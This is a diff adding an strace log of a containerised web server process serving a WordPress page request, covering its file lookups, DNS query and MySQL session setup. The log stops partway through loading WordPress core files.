@@ -1,0 +1,1654 @@
+accept4(3, {sa_family=AF_INET, sin_port=htons(33621), sin_addr=inet_addr("192.168.0.103")}, [128->16], SOCK_CLOEXEC) = 10
+getsockname(10, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("172.18.0.3")}, [128->16]) = 0
+fcntl(10, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(10, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+read(10, "GET / HTTP/1.1\r\nHost: 192.168.0."..., 8000) = 108
+stat("/var/www/html/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+open("/var/www/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/.htaccess", O_RDONLY|O_CLOEXEC) = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=35, ...}) = 0
+read(11, "# BEGIN WordPress\n\n# END WordPre"..., 4096) = 35
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+stat("/var/www/html/index.php", {st_mode=S_IFREG|0644, st_size=418, ...}) = 0
+rt_sigaction(SIGPROF, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGHUP, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGINT, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGQUIT, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGTERM, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGUSR1, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGUSR2, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=30, tv_usec=0}}, NULL) = 0
+rt_sigaction(SIGPROF, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, NULL, 8) = 0
+rt_sigprocmask(SIG_UNBLOCK, [PROF], NULL, 8) = 0
+getcwd("/var/www/html", 4095)           = 14
+chdir("/var/www/html")                  = 0
+fcntl(8, F_SETLK, {l_type=F_RDLCK, l_whence=SEEK_SET, l_start=1, l_len=1}) = 0
+lstat("/var/www/html/index.php", {st_mode=S_IFREG|0644, st_size=418, ...}) = 0
+lstat("/var/www/html", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/index.php", {st_mode=S_IFREG|0644, st_size=418, ...}) = 0
+lstat("/var/www/html/wp-blog-header.php", {st_mode=S_IFREG|0644, st_size=364, ...}) = 0
+stat("/var/www/html/wp-blog-header.php", {st_mode=S_IFREG|0644, st_size=364, ...}) = 0
+stat("/var/www/html/wp-load.php", {st_mode=S_IFREG|0644, st_size=3306, ...}) = 0
+access("/var/www/html/wp-config.php", F_OK) = 0
+stat("/var/www/html/wp-config.php", {st_mode=S_IFREG|0644, st_size=3706, ...}) = 0
+stat("/var/www/html/wp-settings.php", {st_mode=S_IFREG|0644, st_size=16246, ...}) = 0
+lstat("/var/www/html/wp-includes/load.php", {st_mode=S_IFREG|0644, st_size=33907, ...}) = 0
+lstat("/var/www/html/wp-includes", {st_mode=S_IFDIR|0755, st_size=12288, ...}) = 0
+stat("/var/www/html/wp-includes/load.php", {st_mode=S_IFREG|0644, st_size=33907, ...}) = 0
+lstat("/var/www/html/wp-includes/default-constants.php", {st_mode=S_IFREG|0644, st_size=9562, ...}) = 0
+stat("/var/www/html/wp-includes/default-constants.php", {st_mode=S_IFREG|0644, st_size=9562, ...}) = 0
+stat("/var/www/html/wp-includes/plugin.php", {st_mode=S_IFREG|0644, st_size=31677, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-hook.php", {st_mode=S_IFREG|0644, st_size=14052, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-hook.php", {st_mode=S_IFREG|0644, st_size=14052, ...}) = 0
+lstat("/var/www/html/wp-includes/version.php", {st_mode=S_IFREG|0644, st_size=619, ...}) = 0
+stat("/var/www/html/wp-includes/version.php", {st_mode=S_IFREG|0644, st_size=619, ...}) = 0
+access("/var/www/html/.maintenance", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-includes/languages", 0x7ffd088e3460) = -1 ENOENT (No such file or directory)
+lstat("/var/www/html/wp-includes/compat.php", {st_mode=S_IFREG|0644, st_size=15225, ...}) = 0
+stat("/var/www/html/wp-includes/compat.php", {st_mode=S_IFREG|0644, st_size=15225, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-list-util.php", {st_mode=S_IFREG|0644, st_size=6369, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-list-util.php", {st_mode=S_IFREG|0644, st_size=6369, ...}) = 0
+lstat("/var/www/html/wp-includes/functions.php", {st_mode=S_IFREG|0644, st_size=179915, ...}) = 0
+stat("/var/www/html/wp-includes/functions.php", {st_mode=S_IFREG|0644, st_size=179915, ...}) = 0
+lstat("/var/www/html/wp-includes/option.php", {st_mode=S_IFREG|0644, st_size=67744, ...}) = 0
+stat("/var/www/html/wp-includes/option.php", {st_mode=S_IFREG|0644, st_size=67744, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-matchesmapregex.php", {st_mode=S_IFREG|0644, st_size=1796, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-matchesmapregex.php", {st_mode=S_IFREG|0644, st_size=1796, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp.php", {st_mode=S_IFREG|0644, st_size=23753, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp.php", {st_mode=S_IFREG|0644, st_size=23753, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-error.php", {st_mode=S_IFREG|0644, st_size=4585, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-error.php", {st_mode=S_IFREG|0644, st_size=4585, ...}) = 0
+lstat("/var/www/html/wp-includes/pomo/mo.php", {st_mode=S_IFREG|0644, st_size=8462, ...}) = 0
+lstat("/var/www/html/wp-includes/pomo", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/mo.php", {st_mode=S_IFREG|0644, st_size=8462, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/translations.php", {st_mode=S_IFREG|0644, st_size=8857, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/plural-forms.php", {st_mode=S_IFREG|0644, st_size=6941, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/entry.php", {st_mode=S_IFREG|0644, st_size=2887, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/streams.php", {st_mode=S_IFREG|0644, st_size=5948, ...}) = 0
+stat("/var/www/html/wp-includes/wp-db.php", {st_mode=S_IFREG|0644, st_size=99470, ...}) = 0
+access("/var/www/html/wp-content/db.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+open("/etc/hosts", O_RDONLY|O_CLOEXEC)  = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=174, ...}) = 0
+read(11, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 174
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+socket(AF_INET, SOCK_DGRAM|SOCK_NONBLOCK, IPPROTO_IP) = 11
+connect(11, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0
+poll([{fd=11, events=POLLOUT}], 1, 0)   = 1 ([{fd=11, revents=POLLOUT}])
+sendmmsg(11, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\227\317\1\0\0\1\0\0\0\0\0\0\2db\0\0\1\0\1", iov_len=20}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_DONTWAIT|MSG_EOR|MSG_WAITALL|MSG_FIN|MSG_SYN|MSG_CONFIRM|MSG_RST|MSG_SENDPAGE_NOTLAST|MSG_BATCH|MSG_NO_SHARED_FRAGS|0x8800000}, msg_len=20}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\324B\1\0\0\1\0\0\0\0\0\0\2db\0\0\34\0\1", iov_len=20}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_WAITALL|MSG_FIN|MSG_SYN|MSG_CONFIRM|MSG_ERRQUEUE|MSG_NOSIGNAL|MSG_WAITFORONE|MSG_BATCH|MSG_NO_SHARED_FRAGS|MSG_ZEROCOPY|MSG_CMSG_CLOEXEC|MSG_CMSG_COMPAT|0x8000000}, msg_len=20}], 2, MSG_NOSIGNAL) = 2
+poll([{fd=11, events=POLLIN}], 1, 5000) = 1 ([{fd=11, revents=POLLIN}])
+ioctl(11, FIONREAD, [20])               = 0
+recvfrom(11, "\324B\201\200\0\1\0\0\0\0\0\0\2db\0\0\34\0\1", 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 20
+poll([{fd=11, events=POLLIN}], 1, 4999) = 1 ([{fd=11, revents=POLLIN}])
+ioctl(11, FIONREAD, [38])               = 0
+recvfrom(11, "\227\317\201\200\0\1\0\1\0\0\0\0\2db\0\0\1\0\1\2db\0\0\1\0\1\0\0\2X"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 38
+close(11)                               = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 11
+fcntl(11, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(11, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+connect(11, {sa_family=AF_INET, sin_port=htons(3306), sin_addr=inet_addr("172.18.0.2")}, 16) = -1 EINPROGRESS (Operation now in progress)
+poll([{fd=11, events=POLLIN|POLLOUT|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLOUT}])
+getsockopt(11, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+fcntl(11, F_SETFL, O_RDWR)              = 0
+setsockopt(11, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+setsockopt(11, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "J\0\0\0", 4, MSG_DONTWAIT, NULL, NULL) = 4
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\n5.7.33\0\f\0\0\0\31\vUvv\27^p\0\377\377\10\2\0\377\301\25\0\0\0"..., 78, MSG_DONTWAIT, NULL, NULL) = 74
+sendto(11, "l\0\0\1\215\242\n\0\0\0\0\300\10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 112, MSG_DONTWAIT, NULL, 0) = 112
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\2", 4, MSG_DONTWAIT, NULL, NULL) = 4
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0\0\2\0\0\0", 78, MSG_DONTWAIT, NULL, NULL) = 7
+sendto(11, "\22\0\0\0\3SET NAMES utf8mb4", 22, MSG_DONTWAIT, NULL, 0) = 22
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\0\0", 71, MSG_DONTWAIT, NULL, NULL) = 11
+getpid()                                = 68
+sendto(11, "5\0\0\0\3SET NAMES 'utf8mb4' COLLATE"..., 57, MSG_DONTWAIT, NULL, 0) = 57
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\0\0", 60, MSG_DONTWAIT, NULL, NULL) = 11
+sendto(11, "\32\0\0\0\3SELECT @@SESSION.sql_mode", 30, MSG_DONTWAIT, NULL, 0) = 30
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1(\0\0\2\3def\0\0\0\22@@SESSION.sql_m"..., 49, MSG_DONTWAIT, NULL, NULL) = 49
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\5\0\0\3\376\0\0\2\0\212\0\0\4\211ONLY_FULL_GROUP_BY"..., 78, MSG_DONTWAIT, NULL, NULL) = 78
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "ATE,ERROR_FOR_DIVISION_BY_ZERO,N"..., 216, MSG_DONTWAIT, NULL, NULL) = 82
+sendto(11, "m\0\0\0\3SET SESSION sql_mode='NO_ZE"..., 113, MSG_DONTWAIT, NULL, 0) = 113
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\1\0", 134, MSG_DONTWAIT, NULL, NULL) = 11
+sendto(11, "\n\0\0\0\2wordpress", 14, MSG_DONTWAIT, NULL, 0) = 14
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\1\0", 123, MSG_DONTWAIT, NULL, NULL) = 11
+access("/var/www/html/wp-content/object-cache.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-includes/cache.php", {st_mode=S_IFREG|0644, st_size=21601, ...}) = 0
+lstat("/var/www/html/wp-includes/default-filters.php", {st_mode=S_IFREG|0644, st_size=26196, ...}) = 0
+stat("/var/www/html/wp-includes/default-filters.php", {st_mode=S_IFREG|0644, st_size=26196, ...}) = 0
+stat("/var/www/html/wp-includes/l10n.php", {st_mode=S_IFREG|0644, st_size=43479, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-locale.php", {st_mode=S_IFREG|0644, st_size=14547, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-locale-switcher.php", {st_mode=S_IFREG|0644, st_size=5059, ...}) = 0
+sendto(11, "H\0\0\0\3SELECT option_name, option_"..., 76, MSG_DONTWAIT, NULL, 0) = 76
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\2I\0\0\2\3def\twordpress\nwp_optio"..., 112, MSG_DONTWAIT, NULL, NULL) = 112
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "wp_options\foption_value\foption_v"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_can_register\0010\34\0\0\n\vadmin_email\17"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "ail.example.com#\0\0\23\20mailserver_l"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "g\0\22\0\0\32\16posts_per_page\00210\23\0\0\33\vdat"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "e\0010\23\0\0#\fblog_charset\5UTF-8j\0\0$\16a"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nks\00250\16\0\0(\ngmt_offset\2-3\31\0\0)\26def"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "lt_role\nsubscriber\21\0\0001\ndb_versio"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0:\17upload_url_path\0\25\0\0;\20thumbna"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_default_link_type\4none\24\0\0D\22imag"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nts_per_page\00250\35\0\0L\25default_comm"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_multiwidget\";i:1;}5\0\0P\vwidget_t"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "at\0010\27\0\0V\24link_manager_enabled\0010\""..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, ":2:{s:4:\"name\";s:13:\"Administrat"..., 3366, MSG_DONTWAIT, NULL, NULL) = 3366
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, ":\"number\";i:5;}s:12:\"_multiwidge"..., 3366, MSG_DONTWAIT, NULL, NULL) = 3366
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "tly how many clicks your share b"..., 9072, MSG_DONTWAIT, NULL, NULL) = 9072
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "location_post\";a:2:{s:4:\"type\";s"..., 9072, MSG_DONTWAIT, NULL, NULL) = 3387
+lstat("/var/www/html/wp-includes/class-wp-walker.php", {st_mode=S_IFREG|0644, st_size=12378, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-walker.php", {st_mode=S_IFREG|0644, st_size=12378, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-ajax-response.php", {st_mode=S_IFREG|0644, st_size=5024, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-ajax-response.php", {st_mode=S_IFREG|0644, st_size=5024, ...}) = 0
+lstat("/var/www/html/wp-includes/formatting.php", {st_mode=S_IFREG|0644, st_size=265348, ...}) = 0
+stat("/var/www/html/wp-includes/formatting.php", {st_mode=S_IFREG|0644, st_size=265348, ...}) = 0
+lstat("/var/www/html/wp-includes/capabilities.php", {st_mode=S_IFREG|0644, st_size=27288, ...}) = 0
+stat("/var/www/html/wp-includes/capabilities.php", {st_mode=S_IFREG|0644, st_size=27288, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-roles.php", {st_mode=S_IFREG|0644, st_size=8187, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-roles.php", {st_mode=S_IFREG|0644, st_size=8187, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-role.php", {st_mode=S_IFREG|0644, st_size=2614, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-role.php", {st_mode=S_IFREG|0644, st_size=2614, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-user.php", {st_mode=S_IFREG|0644, st_size=20679, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-user.php", {st_mode=S_IFREG|0644, st_size=20679, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-query.php", {st_mode=S_IFREG|0644, st_size=123798, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-query.php", {st_mode=S_IFREG|0644, st_size=123798, ...}) = 0
+lstat("/var/www/html/wp-includes/query.php", {st_mode=S_IFREG|0644, st_size=23472, ...}) = 0
+stat("/var/www/html/wp-includes/query.php", {st_mode=S_IFREG|0644, st_size=23472, ...}) = 0
+lstat("/var/www/html/wp-includes/date.php", {st_mode=S_IFREG|0644, st_size=35000, ...}) = 0
+stat("/var/www/html/wp-includes/date.php", {st_mode=S_IFREG|0644, st_size=35000, ...}) = 0
+lstat("/var/www/html/wp-includes/theme.php", {st_mode=S_IFREG|0644, st_size=99731, ...}) = 0
+stat("/var/www/html/wp-includes/theme.php", {st_mode=S_IFREG|0644, st_size=99731, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-theme.php", {st_mode=S_IFREG|0644, st_size=47257, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-theme.php", {st_mode=S_IFREG|0644, st_size=47257, ...}) = 0
+lstat("/var/www/html/wp-includes/template.php", {st_mode=S_IFREG|0644, st_size=19792, ...}) = 0
+stat("/var/www/html/wp-includes/template.php", {st_mode=S_IFREG|0644, st_size=19792, ...}) = 0
+lstat("/var/www/html/wp-includes/user.php", {st_mode=S_IFREG|0644, st_size=93308, ...}) = 0
+stat("/var/www/html/wp-includes/user.php", {st_mode=S_IFREG|0644, st_size=93308, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-user-query.php", {st_mode=S_IFREG|0644, st_size=29525, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-user-query.php", {st_mode=S_IFREG|0644, st_size=29525, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-session-tokens.php", {st_mode=S_IFREG|0644, st_size=7338, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-session-tokens.php", {st_mode=S_IFREG|0644, st_size=7338, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-user-meta-session-tokens.php", {st_mode=S_IFREG|0644, st_size=2916, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-user-meta-session-tokens.php", {st_mode=S_IFREG|0644, st_size=2916, ...}) = 0
+lstat("/var/www/html/wp-includes/meta.php", {st_mode=S_IFREG|0644, st_size=37476, ...}) = 0
+stat("/var/www/html/wp-includes/meta.php", {st_mode=S_IFREG|0644, st_size=37476, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-meta-query.php", {st_mode=S_IFREG|0644, st_size=22254, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-meta-query.php", {st_mode=S_IFREG|0644, st_size=22254, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-metadata-lazyloader.php", {st_mode=S_IFREG|0644, st_size=5372, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-metadata-lazyloader.php", {st_mode=S_IFREG|0644, st_size=5372, ...}) = 0
+lstat("/var/www/html/wp-includes/general-template.php", {st_mode=S_IFREG|0644, st_size=138839, ...}) = 0
+stat("/var/www/html/wp-includes/general-template.php", {st_mode=S_IFREG|0644, st_size=138839, ...}) = 0
+lstat("/var/www/html/wp-includes/link-template.php", {st_mode=S_IFREG|0644, st_size=133881, ...}) = 0
+stat("/var/www/html/wp-includes/link-template.php", {st_mode=S_IFREG|0644, st_size=133881, ...}) = 0
+lstat("/var/www/html/wp-includes/author-template.php", {st_mode=S_IFREG|0644, st_size=16123, ...}) = 0
+stat("/var/www/html/wp-includes/author-template.php", {st_mode=S_IFREG|0644, st_size=16123, ...}) = 0
+lstat("/var/www/html/wp-includes/post.php", {st_mode=S_IFREG|0644, st_size=213927, ...}) = 0
+stat("/var/www/html/wp-includes/post.php", {st_mode=S_IFREG|0644, st_size=213927, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-page.php", {st_mode=S_IFREG|0644, st_size=6713, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-page.php", {st_mode=S_IFREG|0644, st_size=6713, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-page-dropdown.php", {st_mode=S_IFREG|0644, st_size=2279, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-page-dropdown.php", {st_mode=S_IFREG|0644, st_size=2279, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-post-type.php", {st_mode=S_IFREG|0644, st_size=18236, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-post-type.php", {st_mode=S_IFREG|0644, st_size=18236, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-post.php", {st_mode=S_IFREG|0644, st_size=6355, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-post.php", {st_mode=S_IFREG|0644, st_size=6355, ...}) = 0
+lstat("/var/www/html/wp-includes/post-template.php", {st_mode=S_IFREG|0644, st_size=58725, ...}) = 0
+stat("/var/www/html/wp-includes/post-template.php", {st_mode=S_IFREG|0644, st_size=58725, ...}) = 0
+lstat("/var/www/html/wp-includes/revision.php", {st_mode=S_IFREG|0644, st_size=21305, ...}) = 0
+stat("/var/www/html/wp-includes/revision.php", {st_mode=S_IFREG|0644, st_size=21305, ...}) = 0
+lstat("/var/www/html/wp-includes/post-formats.php", {st_mode=S_IFREG|0644, st_size=6976, ...}) = 0
+stat("/var/www/html/wp-includes/post-formats.php", {st_mode=S_IFREG|0644, st_size=6976, ...}) = 0
+lstat("/var/www/html/wp-includes/post-thumbnail-template.php", {st_mode=S_IFREG|0644, st_size=8216, ...}) = 0
+stat("/var/www/html/wp-includes/post-thumbnail-template.php", {st_mode=S_IFREG|0644, st_size=8216, ...}) = 0
+lstat("/var/www/html/wp-includes/category.php", {st_mode=S_IFREG|0644, st_size=11984, ...}) = 0
+stat("/var/www/html/wp-includes/category.php", {st_mode=S_IFREG|0644, st_size=11984, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-category.php", {st_mode=S_IFREG|0644, st_size=6641, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-category.php", {st_mode=S_IFREG|0644, st_size=6641, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-category-dropdown.php", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-category-dropdown.php", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
+lstat("/var/www/html/wp-includes/category-template.php", {st_mode=S_IFREG|0644, st_size=51324, ...}) = 0
+stat("/var/www/html/wp-includes/category-template.php", {st_mode=S_IFREG|0644, st_size=51324, ...}) = 0
+lstat("/var/www/html/wp-includes/comment.php", {st_mode=S_IFREG|0644, st_size=104343, ...}) = 0
+stat("/var/www/html/wp-includes/comment.php", {st_mode=S_IFREG|0644, st_size=104343, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-comment.php", {st_mode=S_IFREG|0644, st_size=8936, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-comment.php", {st_mode=S_IFREG|0644, st_size=8936, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-comment-query.php", {st_mode=S_IFREG|0644, st_size=41743, ...}) = 0
